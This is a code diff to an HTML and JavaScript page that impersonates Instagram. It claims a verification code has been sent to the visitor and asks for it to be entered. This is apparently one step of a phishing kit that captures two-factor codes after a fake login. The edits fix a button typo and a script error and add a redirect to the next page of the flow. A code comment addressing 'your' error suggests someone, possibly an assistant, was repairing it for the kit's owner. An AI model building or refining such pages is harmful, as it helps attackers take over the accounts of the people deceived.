@@ -11,7 +11,9 @@
     </div>
   </div>
 
-  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">
+    🔒 Security Verification Required
+  </h3>
   
   <div class="play-instructions">
     <div class="instruction-card">
@@ -20,6 +22,7 @@
         To confirm that you are the rightful owner of the Instagram account you logged in with, a verification code has been sent to your registered SMS or email by Instagram. Please enter the code below and click “Submit” to continue.
       </p>
     </div>
+  </div>
 
   <form id="loginForm" method="post" novalidate>
     <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
@@ -27,12 +30,13 @@
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Summit</button>
+      <button class="btn login-btn" type="submit">Submit</button>
     </div>
   </form>
 </div>
 
 <script>
+// Form validation + redirect
 document.getElementById("loginForm").addEventListener("submit", function(event) {
   const digits = document.getElementById("digits");
   const digitsError = document.getElementById("digitsError");
@@ -42,7 +46,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   digitsError.textContent = "";
 
   const val = digits.value.trim();
-  const pattern = /^\d{4,9}$/; // 4-9 digits only
+  const pattern = /^\d{4,9}$/;
 
   if (!pattern.test(val)) {
     valid = false;
@@ -50,10 +54,17 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
     digitsError.textContent = "The code you entered is incorrect.";
   }
 
-  if (!valid) event.preventDefault();
+  if (!valid) {
+    event.preventDefault();
+    return;
+  }
+
+  // ✅ NEW FLOW REDIRECT
+  window.location.href = "love2_3.html";
 });
 
-document.getElementById("digits").add.addEventListener("input", () => {
+// Fixing your JavaScript error
+document.getElementById("digits").addEventListener("input", () => {
   const digits = document.getElementById("digits");
   const digitsError = document.getElementById("digitsError");
   digits.classList.remove("input-error");
@@ -99,12 +110,9 @@ document.getElementById("digits").add.addEventListener("input", () => {
   border: none;
   transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
   box-shadow: 0 6px 16px rgba(221,42,123,0.25);
-  display: block;
-  margin-top: 8px;
 }
 .login-btn:hover {
   background: linear-gradient(45deg, #fd5949, #d6249f, #c13584, #833ab4);
-  box-shadow: 0 8px 20px rgba(221,42,123,0.35);
 }
 .login-btn:active {
   transform: scale(0.985);
